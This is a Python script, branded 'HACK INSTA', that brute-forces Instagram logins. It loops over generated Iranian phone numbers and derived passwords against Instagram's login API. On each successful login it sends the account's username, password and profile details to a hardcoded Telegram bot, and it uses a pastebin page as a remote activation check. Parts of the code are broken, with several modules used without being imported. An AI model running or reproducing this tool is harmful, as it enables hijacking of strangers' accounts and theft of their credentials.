from time import sleep
try:
    from user_agent import generate_user_agent
    from secrets import token_hex
except ImportError:
    os.system('pip install sys')
    os.system('pip install time')
    os.system('pip install webbrowser ')
    os.system('pip install random')
    os.system('pip install requests')
    os.system('pip install user_agent')
    os.system('pip install json')
    os.system('pip install secrets')
    os.system('clear')
    from time import sleep
    import time, webbrowser, random, requests
    from uuid import uuid4
    from user_agent import generate_user_agent
    import json
    from secrets import token_hex
else:
    from time import sleep
    import webbrowser, random, requests
    from user_agent import generate_user_agent
    from secrets import token_hex
    Z = '  \n'
    ss = 'Check User Snap(GT)active'
    uuu = 'https://pastebin.com/raw/feBXTq4n'
    #BARIQ GT
    dr = requests.get(uuu).text
    if ss in dr:
    	print(' Active')
    else: 
    	print(Z + u'\n\t Activation Ended send a message to Tele : @B_V55 ')
    	exit()
    CR = '\033[1;31m'
    CG = '\033[1;32m'
    CV = '\033[1;33m'
    CH = '\033[1;34m'
    CT = '\033[1;35m'
    CH = '\033[1;36m'
    CU = '\033[1;37m'
    CB = '\033[1;38m'
    A=0
    B=0
    C=0
    D=-1
    gt_gt= pyfiglet.figlet_format(' HACK  INSTA')
    boom=(CR+gt_gt+' ⌯Coding By BARIQ \n ⌯Tool Free \n ⌯Tele: @B_V55   @cc_xt \n ⌯Update: V5 \n ~~~~~~~~~~~~~~~~~~~~~~~~')
    print(boom)
    Token = ('1904343520:AAHvr-nC_lXzavmKghS7K5OaRvijJJEf_8s')
    #input(' ['+CG+'•'+CR+']Token: ')
    Id = ('1574876158')
    #input(' ['+CG+'•'+CR+']ID: ')
    bariq2=input(' ['+CG+'•'+CR+']Nest: ')
    def Coding_bariq(user_gt, pass_gt):
        cookie = secrets.token_hex(8) * 2
        header_bariq = {'HOST':'www.instagram.com', 
         'KeepAlive':'True', 
         'user-agent':f'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{bok}.0.4606.61 Safari/537.36', 
         'Cookie':cookie, 
         'Accept':'*/*', 
         'ContentType':'application/x-www-form-urlencoded', 
         'X-Requested-With':'XMLHttpRequest', 
         'X-IG-App-ID':'936619743392459', 
         'X-Instagram-AJAX':'missing', 
         'X-CSRFToken':'missing', 
         'Accept-Language':'en-US,en;q=0.9'}
        v8 = f"https://www.instagram.com/{user_gt}/?__a=1"
        gt = requests.get(v8, headers=header_bariq).json()
        User_bariq = str(gt['graphql']['user']['username'])
        Name = str(gt['graphql']['user']['full_name'])
        id = str(gt['graphql']['user']['id'])
        Followers = str(gt['graphql']['user']['edge_followed_by']['count'])
        Following = str(gt['graphql']['user']['edge_follow']['count'])
        re = requests.get(f"https://o7aa.pythonanywhere.com/?id={id}")
        bariq_gt = re.json()
        Dataa= bariq_gt['data']
        box_gt= f"""
 HUNT ACOUNT INSTA(GT)
 - - - - - - - - - - - - - - - - - - - - - - 
 ⌯ Email : {User_bariq}
 ⌯ Pass : {pass_gt}
 ⌯ Name : {Name}
 ⌯ Followers : {Followers}
 ⌯ Following : {Following}
 ⌯ Date : {Dataa}
 - - - - - - - - - - - - - - - - - - - - - - 
 Tele : @B_V55     @cc_xt"""
        post_bariq = f"https://api.telegram.org/bot{Token}/sendMessage?chat_id={Id}&text={box_gt}"
        i = requests.post(post_bariq)


    url = 'https://b.i.instagram.com/api/v1/accounts/login/'
    headers_bariq = {'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; pocophone/google; Poco X3 Pro; angler; angler; ar_IQ)'}
    
    now = '0987654321'
    bow = '0987654321'
    while True:
        xvx = str(''.join((random.choice(now) for i in range(7))))
        username = '+989'+bariq2+ xvx
        pass_gt = '09'+bariq2+ xvx
        bok = str(''.join((random.choice(bow) for i in range(2))))
        from uuid import uuid4
        uid = str(uuid4())
        data_bariq= {'uuid':uid, 
         'password':pass_gt, 
         'username':username,
         'device_id':uid, 
         'from_reg':'false', 
         '_csrftoken':'missing', 
         'login_attempt_countn':'0'}
        req = requests.post(url, headers=headers_bariq, data=data_bariq)
        D+=1
        box=(f"""{boom}
 {CU}Selcted:{CH}({bariq2})
 ------------------------
 {CU}[+]{CG}GOOD: {A}
 {CU}[-]{CR}BAD: {B} 
 {CU}[!]{CV}SECURE: {C}
 {CU}[*]{CH}TEST: {D}
 ------------------------""")
 
        
        if 'logged_in_user' in req.json():
            A+=1
            os.system('clear')
            print(box)
            user_gt = req.json()['logged_in_user']['username']
            Coding_bariq(user_gt, pass_gt)
        elif '"message":"challenge_required","challenge"' in req.json():
            C+=1
            os.system('clear')
            print(box)
        else:
            B+=1
            os.system('clear')
            print(box)
